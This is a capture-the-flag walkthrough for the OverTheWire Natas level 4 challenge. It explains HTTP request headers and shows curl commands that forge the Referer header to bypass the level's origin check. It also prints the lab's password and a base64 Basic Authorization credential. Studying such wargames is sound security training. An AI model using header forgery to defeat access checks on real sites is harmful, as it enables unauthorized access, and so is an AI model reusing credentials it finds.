# Natas Level 3 → Level 4 request headers

## Previous Flag
<b>QryZXc2e0zahULdHrtHxzyYkj59kUxLQ</b>

## Goal
Username: natas4<br>
URL: http://natas4.natas.labs.overthewire.org<br>

Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
Refresh page

## What I learned
```
Host                        Specifies the domain name of the server (used for virtual hosting)
User-Agent                  Identifies the client (browser, tool, bot)
Accept	                    Lists MIME types the client can process (text/html, application/json)
Accept-Encoding	            Indicates accepted compression methods (gzip, br, deflate)
Accept-Language	            Lists preferred languages (en-US, fr)
Content-Type	            Type of content being sent (application/json, multipart/form-data)
Content-Length	            Size of the body in bytes (used in POST/PUT requests)
Authorization	            Credentials for authentication (Basic, Bearer tokens) in base64 👀
Cookie	                    Sends cookies from the browser to the server
Referer	                    URL of the previous page that linked to this request 👀
Origin	                    Indicates where the request originated (used in CORS)
Connection	                Controls whether the connection stays open (keep-alive) or closes
Cache-Control	            Controls caching behavior (no-cache, max-age)
If-Modified-Since	        Sends cached version timestamp; server responds 304 Not Modified if unchanged
Range	                    Requests only part of the resource (bytes 0–499)
X-Requested-With	        Often XMLHttpRequest for AJAX requests
DNT	                        "Do Not Track" setting (1 = opt-out of tracking)
Upgrade-Insecure-Requests   Asks server to prefer HTTPS if available
```

## Solution
```
F12 → Network → index.php
Right Click index.php → Copy → Copy as cURL (cmd)
curl ^"http://natas4.natas.labs.overthewire.org/index.php^" ^
  -H ^"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7^" ^
  -H ^"Accept-Language: en-US,en;q=0.9^" ^
  -H ^"Authorization: Basic bmF0YXM0OlFyeVpYYzJlMHphaFVMZEhydEh4enlZa2o1OWtVeExR^" ^
  -H ^"Cache-Control: max-age=0^" ^
  -H ^"Connection: keep-alive^" ^
  -b ^"_ga=GA1.1.7833527.1753397760; _ga_RD0K2239G0=GS2.1.s1754315385^$o21^$g1^$t1754316852^$j60^$l0^$h0^" ^
  -H ^"Referer: http://natas4.natas.labs.overthewire.org/index.php^" ^ 👀
  -H ^"Upgrade-Insecure-Requests: 1^" ^
  -H ^"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0^" ^
  --insecure

# Need change Referer to natas4 → natas5
# Note: In Firefox right-click on main request (‘index.php’ or ‘/’) & select ‘Edit and Resend’
curl ^"http://natas4.natas.labs.overthewire.org/index.php^" ^
  -H ^"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7^" ^
  -H ^"Accept-Language: en-US,en;q=0.9^" ^
  -H ^"Authorization: Basic bmF0YXM0OlFyeVpYYzJlMHphaFVMZEhydEh4enlZa2o1OWtVeExR^" ^
  -H ^"Cache-Control: max-age=0^" ^
  -H ^"Connection: keep-alive^" ^
  -b ^"_ga=GA1.1.7833527.1753397760; _ga_RD0K2239G0=GS2.1.s1754315385^$o21^$g1^$t1754316852^$j60^$l0^$h0^" ^
  -H ^"Referer: http://natas5.natas.labs.overthewire.org/index.php^" ^
  -H ^"Upgrade-Insecure-Requests: 1^" ^
  -H ^"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0^" ^
  --insecure
```

## Flag


## Continue
[Continue](/overthewire/Natas0405.md)